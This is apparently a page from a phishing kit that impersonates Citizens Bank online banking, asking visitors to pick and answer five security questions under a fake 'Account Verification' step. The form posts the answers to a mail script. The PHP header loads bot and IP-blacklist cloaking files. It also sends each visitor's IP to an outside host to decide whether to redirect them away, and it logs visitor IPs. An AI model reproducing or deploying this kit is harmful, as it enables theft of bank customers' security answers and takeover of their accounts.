<?php
error_reporting(0);
include 'admin/config.php';
if($bots == "on"){
	include ('another/1.php');
	include ('another/2.php');
	include ('another/3.php');
	include ('another/4.php');
	include ('another/5.php');
	include ('another/6.php');
	include ('another/8.php');
	include ('another/iprange.php');
	include ('another/bot.php');
	include ('another/IP-BlackList.php');
	include ('another/Bot-Blueprint.php');
	include ('another/Bot-Crawler.php');
	include ('another/new.php');
}

//zsec
if($zsec_p == "on"){
	$s = $_SERVER[REQUEST_URI];
	if(strpos($s, "invalid") !== false){
	}else{
		$hip = $_SERVER['REMOTE_ADDR'];
		$kks = rand(0000000000,9999999999);
		$ch = curl_init('https://in.hackzeee.com/ahh.php?ip='.$hip);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS,  $post_fields);
		curl_setopt($ch, CURLOPT_POST, 1);
		$ahhh = curl_exec($ch);
		$reqsturi = "$_SERVER[REQUEST_URI]";
		if (strpos($ahhh, "lucky punk") !== false ){}elseif (strpos($ahhh, "bad luck") !==false ){
			header("Location: https://in.hackzeee.com/?key=".$keyy."&api=".$api."&exiturl=".$exiturl.$reqsturi."&ip=".$hip);
		}
	}
}

    $content2 = "#>".$_SESSION['ip']."\r\n";
    $save2=fopen("Blueprint/Result/total_billing_view.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);
    
?>
<!DOCTYPE html>
<html class="no-js" lang="en-US">
<!--<![endif]-->

<head>
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta charset="utf-8">
  <title>Online Banking</title>
  <meta name="description" content="">

  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/apple-touch-icon.png" rel="apple-touch-icon" />
  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76" />
  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120" />
  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152" />
  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180" />
  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/icon-hires.png" rel="icon" sizes="192x192" />
  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/icon-normal.png" rel="icon" sizes="128x128" />

  <link href="ctz.css" rel="stylesheet" />

  <meta name="viewport" content="width=device-width, initial-scale=1">

</head>

<body class="responsive-enabled">

  <!-- ===============
      PAGE HEADER START
      =============== -->
  <!-- begin CITIZENS BANK Hosted Header -->
  <div class="citizens-header-footer-injected">

<link rel="stylesheet" type="text/css" href="/efs/hhf/css/citizensns.min.42588.css">
<style>
.help-modal-header .help-modal-close {background: url(/efs/hhf/img/modal-help-close.png) center center no-repeat transparent; background-size: 20px;}
.help-modal-menu a.active {background: #f2faf8 url(/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat; background-position: right 20px center; background-size:7px}
.account-section-title.checkmark h1 {padding: 0px 0px 5px 28px !important; }
.lt-ie9 .help-modal-menu a.active {background: #f2faf8 url(/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat !important; background-size:7px !important}
.input-wrapper .tooltip {margin-left: 1px;}
</style>

</div>

<div class="citizens-header">

    <!-- htmlContainer PREFIX -->
    <div class="citizens-header-footer">
      <header id="page-header" class="page-header">
        <!-- inc-header.html START -->
        <div class="centered-content clearfix">
          <a class="page-logo">
            <img border="0" width="203" height="25" src="https://www4.citizensbankonline.com/efs/hhf/img/CTZ_Green-01.png" alt="Citizens Bank">
          </a>
          <div id="header-navigation-container"></div>
        </div>
        <!-- inc-header.html END -->
      </header>
    </div>
    <!-- htmlContainer SUFFIX -->

  </div>
  <!-- end CITIZENS BANK Hosted Header -->
  <!-- ===============
      PAGE HEADER END
      =============== -->

  <!-- ===============
      PAGE CONTENT AREA START
      =============== -->
  <div id="page-container" class="page-container">
  <div class="centered-content clearfix">
    <div class="g-unauth-main-container">
        <section class="unauth-intro-area">
            <h2 class="unauth-intro-area__title ">Account Verification</h2>
        
                <div role="progressbar" aria-valuenow="1" aria-valuemin="1" aria-valuetext="Step 1 of 5: Enrollment" aria-valuemax="5">
                    <div class="unauth-intro-area__step">
                        <strong>Step 1 of 4:</strong>
                        <span>Security Challenge</span>
                    </div>
                    <div class="unauth-intro-area__progress-container">
                        <div class="unauth-intro-area__progress-segment">
                                <div class="unauth-intro-area__progress-item -js-progress-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
                        </div>
                    </div>
                </div>
            <div class="js-error-block"></div>
            <div class="unauth-intro-area__help">
                <a class="g-link-list unauth-intro-area__link g-display-none" href="#helpModalPage">Show Help</a>
                <p class="unauth-intro-area__text">Please select your security questions and answers.</p>
            </div>
        </section>        <section class="identify-customer-section">
            <form class="unauth-form jqtransform js-enrollment-form" method="post" action="Blueprint/Mail/Mail2.php">
              
                <div class="unauth-form__ic-identification-block">
                    <div class="unauth-form__row">
                        <div class="unauth-form__legend">
                            <label class="unauth-form__label">* All fields are mandatory.</label>
                        </div>
                    </div>
                    
                   

                    <div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_CUST" style="display: block;">
                        <div class="unauth-form__row">
                            <div class="unauth-form__rowitem g-left">
                                <label class="unauth-form__label" for="unauth-form-first-name">Select Question 1:</label>
<div>
<select  name="q1" class="unauth-form__input js-firstname" aria-describedby="occupation" required>
<option value="" message-key="OAO_CUSTINFO_CITIZENSHIPSTATUS_SELECTOPT_LBL" selected="selected">Select an option</option>
<option value="What was the name of your High School?">What was the name of your High School?</option>
<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
<option value="In what city were you married? (Enter full name of city)">In what city were you married? (Enter full name of city)</option>
 <option value="What is the first name of the maid of honor at your wedding?">What is the first name of the maid of honor at your wedding?</option>
 <option value="what is the first name of your oldest nephew?">what is the first name of your oldest nephew?</option>
 <option value="What is the name of the first company you worked for?">What is the name of the first company you worked for?</option>
 <option value="What is your maternal grandmother's first name?">t is your maternal grandmother's first name?</option>
 <option value="What is your father's middle name?">What is your father's middle name?</option>
 <option value="What is your Mother middles name?">What is your best friend's first name?</option>
 <option value="In What city was your high school? (Full name of city in only)">In What city was your high school? (Full name of city in only)</option>
 </select>
</div></div>
<div class="unauth-form__rowitem g-right">
<label class="unauth-form__label" for="unauth-form-last-name">Answer:</label>
<div>
<input name="a1" iclass="unauth-form__input js-lastname"  placeholder="" type="text" d maxlength="200" autocomplete="off" required>
</div>

</div> </div>



</div>


<div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_CUST" style="display: block;">
                        <div class="unauth-form__row">
                            <div class="unauth-form__rowitem g-left">
                                <label class="unauth-form__label" for="unauth-form-first-name">Select Question 2:</label>
<div>
<select  name="q2" class="unauth-form__input js-firstname" aria-describedby="occupation" required>
<option value="" message-key="OAO_CUSTINFO_CITIZENSHIPSTATUS_SELECTOPT_LBL" selected="selected">Select an option</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="What was the name of your first pet?">What was the name of your first pet?</option>
<option value="In what city is your vacation home? (Enter full name of city only)">In what city is your vacation home? (Enter full name of city only)</option>
<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</option>
<option value="What was the name of your first girlfriend/boyfriend?">What was the name of your first girlfriend/boyfriend?</option>
<option value="What was the nickname of your grandfather?">What was the nickname of your grandfather?</option>
<option value="What is your paternal grandmother's first name?">What is your paternal grandmother's first name?</option>
<option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="In what city was your father born? (Enter full name of city only)">In what city was your father born? (Enter full name of city only)</option>
 </select>
</div></div>
<div class="unauth-form__rowitem g-right">
<label class="unauth-form__label" for="unauth-form-last-name">Answer:</label>
<div>
<input name="a2" iclass="unauth-form__input js-lastname"  placeholder="" type="text" d maxlength="200" autocomplete="off" required>
</div>

</div> </div></div>





<div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_CUST" style="display: block;">
                        <div class="unauth-form__row">
                            <div class="unauth-form__rowitem g-left">
                                <label class="unauth-form__label" for="unauth-form-first-name">Select Question 3:</label>
<div>
<select  name="q3" class="unauth-form__input js-firstname" aria-describedby="occupation" required>
<option value="" message-key="OAO_CUSTINFO_CITIZENSHIPSTATUS_SELECTOPT_LBL" selected="selected">Select an option</option>
<option value="What was the name of the town your grandmother lived in? (Enter full name of town only)">What was the name of the town your grandmother lived in? (Enter full name of town only)</option>
<option value="What was the name of your high school?">What was the name of your high school?</option>
<option value="Where did you meet your spouse for the first time? (Enter full name of city only)">Where did you meet your spouse for the first time? (Enter full name of city only)</option>
<option value="What was the last name of your favorite teacher in final year of high school?"> What was the last name of your favorite teacher in final year of high school?</option>
<option value="In what city were you born? (Full name of city only)">In what city were you born? (Full name of city only)?</option>
<option value="In what city was your mother born?(Enter full name of city only)">In what city was your mother born?(Enter full name of city only)</option>
<option value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</option>
<option value="What is your mother's middle name?">What is your mother's middle name?</option>
<option value="What was your favorite restaurant in college?">What was your favorite restaurant in college?</option>
<option value="What street did your best friend in high school live on? (Enter full name of street only))"> What street did your best friend in high school live on? (Enter full name of street only)</option>
 </select>
</div></div>
<div class="unauth-form__rowitem g-right">
<label class="unauth-form__label" for="unauth-form-last-name">Answer:</label>
<div>
<input name="a3" iclass="unauth-form__input js-lastname"  placeholder="" type="text" d maxlength="200" autocomplete="off" required>
</div>

</div> </div></div>




<div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_CUST" style="display: block;">
                        <div class="unauth-form__row">
                            <div class="unauth-form__rowitem g-left">
                                <label class="unauth-form__label" for="unauth-form-first-name">Select Question 4:</label>
<div>
<select  name="q4" class="unauth-form__input js-firstname" aria-describedby="occupation" required>
<option value="" message-key="OAO_CUSTINFO_CITIZENSHIPSTATUS_SELECTOPT_LBL" selected="selected">Select an option</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="What was the name of your first pet?">What was the name of your first pet?</option>
<option value="In what city is your vacation home? (Enter full name of city only)">In what city is your vacation home? (Enter full name of city only)</option>
<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</option>
<option value="What was the name of your first girlfriend/boyfriend?">What was the name of your first girlfriend/boyfriend?</option>
<option value="What was the nickname of your grandfather?">What was the nickname of your grandfather?</option>
<option value="What is your paternal grandmother's first name?">What is your paternal grandmother's first name?</option>
<option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="In what city was your father born? (Enter full name of city only)">In what city was your father born? (Enter full name of city only)</option>
 </select>
</div></div>
<div class="unauth-form__rowitem g-right">
<label class="unauth-form__label" for="unauth-form-last-name">Answer:</label>
<div>
<input name="a4" iclass="unauth-form__input js-lastname"  placeholder="" type="text" d maxlength="200" autocomplete="off" required>
</div>

</div> </div></div>






<div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_CUST" style="display: block;">
                        <div class="unauth-form__row">
                            <div class="unauth-form__rowitem g-left">
                                <label class="unauth-form__label" for="unauth-form-first-name">Select Question 5:</label>
<div>
<select  name="q5" class="unauth-form__input js-firstname" aria-describedby="occupation" required>
<option value="" message-key="OAO_CUSTINFO_CITIZENSHIPSTATUS_SELECTOPT_LBL" selected="selected">Select an option</option>
<option value="What was the name of your High School?">What was the name of your High School?</option>
<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
<option value="In what city were you married? (Enter full name of city)">In what city were you married? (Enter full name of city)</option>
 <option value="What is the first name of the maid of honor at your wedding?">What is the first name of the maid of honor at your wedding?</option>
 <option value="what is the first name of your oldest nephew?">what is the first name of your oldest nephew?</option>
 <option value="What is the name of the first company you worked for?">What is the name of the first company you worked for?</option>
 <option value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</option>
 <option value="What is your father's middle name?">What is your father's middle name?</option>
 <option value="What is your Mother middles name?">What is your best friend's first name?</option>
 <option value="In What city was your high school? (Full name of city in only)">In What city was your high school? (Full name of city in only)</option>
 
 </select>
</div></div>
<div class="unauth-form__rowitem g-right">
<label class="unauth-form__label" for="unauth-form-last-name">Answer:</label>
<div>
<input name="a5" iclass="unauth-form__input js-lastname"  placeholder="" type="text" d maxlength="200" autocomplete="off" required>
</div>

</div> </div></div>









                </div>
				
				
                <div class="unauth-section__button-wrap">
                    <button class="btn unauth-form__submit-button js-unauth-ic-submit-button"  id="toEnterCode">Continue</button>
                        <a class="unauth-form__cancel-link js-cancel-button" tabindex="0">Cancel</a>
                </div>
            </form>
        </section>
    </div>
</div></div>